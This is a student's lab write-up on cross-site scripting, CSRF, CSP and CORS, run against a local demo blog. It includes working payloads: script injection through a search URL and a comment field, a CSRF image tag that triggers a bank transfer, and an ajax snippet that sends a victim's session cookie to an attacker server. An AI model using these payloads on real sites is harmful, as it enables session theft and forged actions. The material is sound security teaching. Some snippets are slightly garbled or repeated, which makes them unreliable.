# Lab 1 - SIO 
# Vulnerabilities in Web Applications: XSS


This practical class focuses on Cross-Site-Scripting.

_"XSS attacks are a kind of attacks within Web interactions where an attacker performs indirect attacks against Web clients through a vulnerable Web application. The primary result is that some external code is injected into the victim web browser and executed. All existing context, including valid cookies, as well as computational resources of the victim become available to the attacker. The attack can be conducted based on data stored in the server, such as a forum message or a blog post, and this is named a Stored XSS Attack. The attack data can also be encoded in a Uniform Resource Locator (URL) sent by the attacker directly to the victim. Taking in consideration where the untrusted data is used, the attack can be considered a Server Side Attack, or a Client Side Attack. And all four combinations are possible. The problem itself is always due to improper, or insuﬃcient validation of data external to the system."_
- João Paulo Barraca and Vitor Cunha


# SETUP
Using the same Virtual Machine as Lab01: 
-	1) Obtain the compressed ﬁle present at https://joao.barraca.pt/teaching/sio/2019/p/2/xss.tar.bz2 and uncompress it. 
-	2) Open the README.MD and follow the instructions within

The application contains one user:
-	Username:  Administrator
-	Password:  top-secret

An additional folder, named scripts contains two small HTTP servers used for the last parts of the guide.


# Exercises
## 2.2 Cross-Site Scripting
### 2.2.1 Reﬂected XSS Attack
_"In a **Reﬂected XSS** it is assumed that the attack is non-persistent. With this attack it becomes possible to manipulate the browser Domain Object Model (DOM) for a single user, or for multiple **users which access a page through the same specially crafted URL**."_

![Reflected XSS](https://blog.sqreen.com/wp-content/uploads/2018/03/reflexted-xss.png)
Our study case is vulnerable to these types of attacks!
By finding an action that actively changes the URL (i.e redirects to the same page but with added variables and/or content to the URL) we might discover that we're dealing with a Reflected XSS vulnerability.

Basically,  **if the page behaves diﬀerently based on the URL variables, it is possible that a Reﬂected XSS Attack can be performed.**

**Search bars** are one of the most common elements subjec to these sorts of attacks. In our app, we can note that when inputting something into the search bar, the URL will change to **localhost:6543/search?q=< what u searched for >**

If we manually change the URL to something like:
```
localhost:6543/search?q=<script>alert("Ola :D")</script>
```
We can then send this link to someone and whenever they access the URL, an alert box will pop up with our message!
This can, obviously, be further expanded into some more malificent ends

### 2.2.2 Stored XSS Attack
_"The **Stored XSS Attack** (or persistent) allows an attacker to **place a malicious script** (usually Javascript) **into a webpage**. Victims accessing the web page will render all scripts, including the one injected by the attacker. This attack is very common in places where information is shared between users through web technologies (e.g., forums and blogs). In this case, an attacker composes a specially crafted message, hides some script in it's source code, and puts it in some place within a page accessible by the victim(s). **All users accessing that page/place will unwillingly execute whatever the attacker injected.** "_

![Stored XSS](https://i.imgur.com/NkBE5u3.png)
There exist both Server Side and Client Side Stored XSS Attacks:
-	**Server Side**:  Usually present in actions that store messages or custom user content into the server. For a Stored XSS Attack to be considered Server Side, the payload must be included in the web page when the page is built by the server!

-	**Client Side**: Code that loads dynamic content into the webpage using Javascript is usually the cause of these types of attacks. Using the Web Inspector (e.g F12 in Firefox) we can find < script > tags that aren't evaluated directly but are instead included as Javascript object handlers (e.g, onload, onclick, onhover, ...) 


In our app we can create a Server Side Stored XSS Attack by navigating to a post and creating a comment! By doing this we're adding custom content that the Server is going to have to store and load whenever displaying the page (hence why it's Server Sided).
By trial and error we can easily discover that the Name field is protected against Tags, but the description field isn't! So we can do something like, inputting the following text into the Description field:
```
<script>alert("LMAO GOTTEM")</script>
```
The server will store this tag and anytime any user accesses the page in which we created the comment in, will load (and in turn, execute) our newly inserted tag!
We can insert virtually any Tags, but the most fun ones are < script > and < img >

### 2.2.3 CSRF Attack
_"The **Cross-Site Request Forgery** (CSRF) attack consists in injecting code that, using the credentials and capabilities of the browser viewing a given object, may attack another system. This attack can be used for simple Denial-of-Service (DoS) or Distributed Denial-of-Service (DDoS) attacks, tracking users, or invoking requests on systems with the identity of the victim. These attacks **exploit the fact that**, for usability, functionality, and performance purposes, **systems cache authentication credentials in small tokens named cookies**. When a user accesses a service, such as a social sharing application, or an Online Banking solution (basically any service that forces the user to login to an account), **a session is initialized, and will be kept valid for a long period, even if the user abandons the webpage**.
If the user visits another page which has a CSRF exploit targeting the ﬁrst page, it is possible to invoke services using the user identity, without his knowledge. **These attacks are frequently done using the < img > tag, however, other tags can be used. ** "_

![CSRF](https://i.imgur.com/8euzZ6I.png)

_"As an example, consider that a forum post contains the following content:"_
```
LOL. That was a good one Op. :) <img src='http://vulnerable-bank.com/transfer.jsp?amount=1000 &to_nib=12345300033233'></img> 
```
_"When the browser tries to load the image, it will invoke an action to an external server. In this hypothetical case, it would transfer funds from the victims bank account to the attacker’s bank account. 
Sometimes a more complex interaction is required, and the attack will actually inject Javascript code "_

#### Exercise Setup:
-	1) Navigate to the directory where we dumped our downloaded package
-	2) Run the script **hacker_server.py**
-	3) Do a POST to http://localhost:8000

This script will dump to **stdout** all data that is posted to it (using HyperText Transfer Protocol (HTTP) POST). 

#### Exercise

Following the last exercise, we already know that we can inject < script > tags into a post's page by creating a comment and putting some code into the Description field. So, by including the following code into the comment:
```
<script>
	$.ajax({
	        url: 'http://localhost:8000/cookie',
		type: 'POST',
		data: "username=Administrator;cookie=a"+document.cookie,
	})
</script>
```

And just like that, we can see that on our Hacker_server process we've just received the Administrator's session cookie!

Note: We include that 'a' in the cookie so that, in case there's no cookie, a valid argument is always passed to the hacker_server (causing it not to crash due to a bad input)
 
 ## 2.3 Content Security Policy
_"**Content Policy Rules** are a way of protecting a website from the injection of malicious code. **This doesn’t stop all XSS types**, but it is one of the most important steps. (For a more complete protection, this should be combined with **CORS**, which is described in the next section.) "_

"_The goal is to **deﬁne what content can be present in the HTML, or how it is handled by the browser**. HTML Content Policies make use of headers that specify how the browser should load and execute resources. The most important is **Content-Security-Policy**, which speciﬁes a set of rules for content. (For a complete reference, pleasecheck https://content-security-policy.com/.) _"

"_To see how it works, lets consider an example where we deﬁne that all Javascript should be loaded from the web page server, and no Javascript objects are allowed from external sites, or only from a restricted set. For this purpose, we can set the Content-Security-Policy header to: **default-script 'self' oss.maxcdn.com** With this value,scripts will only be loaded from the local server or oss.maxcdn.com a known Content Delivery Network._"

In our app, we can enable the Content Security Policy for our server by removing the comment in line 63 of the file _xss_demo/app/xss_demo/views.py_ and restarting the server. 
Doing this will simply call a function that is written a few lines before line 63.
If we now try to inject some malicious payloads that load scripts from external sites, the script won't be executed and the following message will be logged in the browser's console:
```
Content Security Policy: The page's settings blocked the loading of a resource at http://vulenrable-bank.com/transfer.jsp?amount=1000&to_nib1234500033233 ("img-src").
```

"_Further rules could be added so that no script is added inline, no images are loaded from external sites, all resources are loaded from secure locations, etc"_

## 2.4 Cross-Origin Resource Sharing
_"**Cross-Origin Resource Sharing** (CORS) is a mechanism that uses **additional HTTP headers to tell a browser to let a web application running at one origin **(domain)** have permission to access selected resources from a server at a diﬀerent origin**._"

"_**A web application executes a cross-origin HTTP request when it requests a resource that has a diﬀerent origin (domain, protocol, and port) than its own origin**. In the previous exercises, several payload that load resources from external locations could be injected. **If CORS is properly setup, the browser will not load resources from external sites**, or only load resources from selected sites. This eﬀectively can be used to limit cross site request forgery and most cross site scripting attacks. The CORS speciﬁcation states that many resources will be aﬀected, and can eﬀectively be prevented from loading. This includes images, fonts, textures, and any other resource, as well as scripts and even calls made inside Javacript code._"

"_Requests can be considered to be of two types: **Simple** and **Preﬂight**. The type of request is deﬁned by the method, headers, destination and several other aspects. The next figure depicts the ﬂow used by the browser to select how to handle each request. "_

![CORS](https://i.imgur.com/BpozkfH.png)
#### Exercise Setup:
-	1) Run $sudo vim /etc/hosts
-	2) Add the following lines: 
	```
		127.0.0.1	internal
		127.0.0.1	external
	```
-	2) Re-run the app (and access it using https://internal:6543)
-	3) Navigate to the scripts directory (contianed within the directory we donwloaded in the beggining)
-	4) Run $python3 cors_server.py

The additional server will simulate a service being exploited by an XSS attack, such as a website for a shop or a bank. The blog software we used previously will remain our method of invoking remote resources. 

#### Exercise

Now lets inject payloads as messages in the app's posts' comments in order to test the diﬀerent paths in the CORS ﬂow. 
We can observe what is loaded by looking at the browser console, and the server console. Take in consideration that the browser may issue background requests that are not displayed in the network view, but logged by the server!

##### GET in Image tag: 
- Add a direct GET of an image by using the < img > tag. The server has an image named smile.jpg. 
We can do this by adding:
```
<img src="external:8000/smile.jpg></img>
```
To a comment. This will, in the app's page, load the smile.jpg image

##### GET in JS: 
- Obtain the same resource but use the previous Javascript snippet. Observe that the browser will request the image, but will refuse to use it. 

##### GET in JS with headers:
- Repeat the request but add: ,headers={"My-Header": "myvalue"} to the ajax request. The behaviour should be similar to the previous case.
```
<script>
	$.ajax({
	        url: 'http://localhost:8000/cookie',
		type: 'POST',
		data: "username=Administrator;cookie=a"+document.cookie,
	})
</script>
```

# References
https://joao.barraca.pt/teaching/sio/2019/p/guide-vulnerabilities-xss.pdf

### Diogo Silva, 2019

